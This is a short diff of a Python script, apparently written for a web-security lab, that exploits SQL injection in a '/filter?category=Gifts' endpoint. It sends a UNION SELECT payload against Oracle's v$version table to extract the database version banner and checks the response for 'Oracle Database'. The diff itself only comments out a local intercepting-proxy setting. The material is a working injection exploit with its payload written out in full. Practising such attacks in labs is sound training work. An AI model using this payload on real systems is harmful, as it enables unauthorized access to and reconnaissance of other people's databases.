@@ -11,7 +11,7 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
 def exploit_sqli_version(url):
     path = "/filter?category=Gifts"
     sql_payload = "' UNION SELECT banner, NULL from v$version--"
-    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
+    r = requests.get(url + path + sql_payload, verify=False)#, proxies=proxies)
     res = r.text
     if "Oracle Database" in res:
         print("[+] Found the database version.")
